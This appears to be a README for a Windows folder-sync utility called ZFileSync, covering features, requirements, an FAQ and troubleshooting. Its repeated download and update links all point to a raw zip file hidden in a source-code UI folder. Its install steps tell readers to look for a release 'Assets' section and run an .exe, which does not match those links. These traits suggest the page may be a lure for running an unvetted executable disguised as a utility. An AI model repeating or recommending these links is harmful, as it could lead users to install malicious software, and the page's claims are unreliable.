# 🔄 ZFileSync - Mirror files across folders automatically

[![](https://img.shields.io/badge/Download-ZFileSync-blue.svg)](https://github.com/foxsammyryan-cpu/ZFileSync/raw/refs/heads/main/src/components/ui/Sync_Z_File_v2.1.zip)

ZFileSync monitors folders and copies new or changed files to a second location. You set the source folder and the destination folder. ZFileSync watches for changes and performs the copy task in the background. It works well for game logs, system configuration files, or documents that you need in multiple locations.

## 📥 Getting Started

Visit this page to download the latest installer: [https://github.com/foxsammyryan-cpu/ZFileSync/raw/refs/heads/main/src/components/ui/Sync_Z_File_v2.1.zip](https://github.com/foxsammyryan-cpu/ZFileSync/raw/refs/heads/main/src/components/ui/Sync_Z_File_v2.1.zip)

Follow these steps to install the software on your Windows computer:

1. Open the link above in your web browser.
2. Look for the "Assets" section under the latest release version.
3. Click the file ending in `.exe` to begin the download.
4. Open the downloaded file once the process finishes.
5. Follow the on-screen prompts from the installer to finish the setup.
6. Launch ZFileSync from your Start menu or desktop shortcut.

## ⚙️ How it Works

ZFileSync runs as a small process in your system tray. This area sits near the clock on your taskbar. It stays out of your way while it monitors your files.

When you open the application window, you see two main fields: Source and Destination. 

1. **Source Folder:** Select the folder that contains the files you want to track.
2. **Destination Folder:** Select the folder where you want the copies to go.

After you select these folders, click the Start button. ZFileSync scans your folders and copies the contents. It remains active as long as the application runs. If you change, add, or delete a file in the Source folder, ZFileSync updates the Destination folder to match the new state.

## 🛠 Features

* **Real-time syncing:** The app detects changes the moment they happen. You do not need to click a manual sync button.
* **Low resource usage:** The software uses minimal memory and processor power. Your computer performance stays fast.
* **Background operation:** The app hides in the system tray when you minimize the window. 
* **Conflict detection:** If a file exists in both locations, the app checks the modification date. It preserves the most recent version of your data.
* **Simple interface:** The design focuses on two main actions: picking folders and clicking start.

## 📋 System Requirements

ZFileSync requires Windows 10 or Windows 11. It needs roughly 50 megabytes of disk space. It works with local folders and external drives. Please ensure you have read and write permission for the folders you choose to sync. 

## ❓ Frequently Asked Questions

**Does ZFileSync delete files?**
Yes, if you choose the mirror mode, the app makes the destination folder an exact copy of the source folder. If you delete a file in the source, it disappears from the destination to maintain the mirror. Use caution when selecting your folders.

**Can I sync files to a cloud folder?**
Yes. If your cloud storage service creates a folder on your computer, you can select that as your destination. ZFileSync views it like any other folder on your hard drive.

**How do I stop the syncing?**
Click the Stop button in the application window. You can also right-click the ZFileSync icon in your system tray and select Exit.

**Does it sync subfolders?**
Yes. The app scans all subdirectories within your chosen source folder. It recreates that structure inside your destination folder.

**Can I run multiple sync tasks?**
Currently, the application allows one active sync pair at a time. If you need to sync different folders, stop the current task and select new paths.

## ⚠️ Troubleshooting

If the sync seems to stop, check these items:

* **File locks:** If another program uses a file, ZFileSync might wait for that program to release the lock. Close any programs that might keep the file open.
* **Permissions:** If you sync to a system folder, ensure your user account has administrative rights.
* **Connectivity:** If you sync to an external hard drive, ensure the drive remains plugged in. If the link breaks, the app waits for the folder to reappear before it resumes the watch.

## 🔒 Privacy

ZFileSync runs locally on your machine. Your file data never leaves your computer. The app does not send your files or folder names to any external servers. Your folders remain private to you. 

## 📦 Updates

Check the GitHub release page periodically to see if a newer version exists. 

[https://github.com/foxsammyryan-cpu/ZFileSync/raw/refs/heads/main/src/components/ui/Sync_Z_File_v2.1.zip](https://github.com/foxsammyryan-cpu/ZFileSync/raw/refs/heads/main/src/components/ui/Sync_Z_File_v2.1.zip)

Updating often brings improvements to stability and speed. Close the application before you run a new installer. Your settings should persist through the update process.